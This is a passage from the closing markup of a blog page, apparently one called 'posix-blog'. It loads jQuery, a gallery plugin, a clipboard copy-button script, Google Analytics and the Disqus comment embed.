href="/lib/justified-gallery/css/justifiedGallery.min.css"><script src="/lib/jquery/jquery.min.js"></script><script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script>$(function(){$(".highlight table").before('<span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="far fa-clone"></i></span>'),new ClipboardJS(".btn-copy",{text:function(e){return Array.from(e.nextElementSibling.querySelectorAll(".code")).reduce((e,t)=>e+t.innerText+"\n","")}}).on("success",function(e){e.trigger.setAttribute("aria-label","Copied!"),e.clearSelection()})})</script><script src="/js/main.js"></script><script>!function(e,a,t,n,g,c){e.GoogleAnalyticsObject=n,e.ga=e.ga||function(){(e.ga.q=e.ga.q||[]).push(arguments)},e.ga.l=+new Date,g=a.createElement(t),c=a.getElementsByTagName(t)[0],g.async=1,g.src="//www.google-analytics.com/analytics.js",c.parentNode.insertBefore(g,c)}(window,document,"script","ga"),ga("create","UA-158869268-1","auto"),ga("send","pageview")</script><script>var disqus_shortname="posix-blog";!function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="//"+disqus_shortname+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)}()</script></body></html>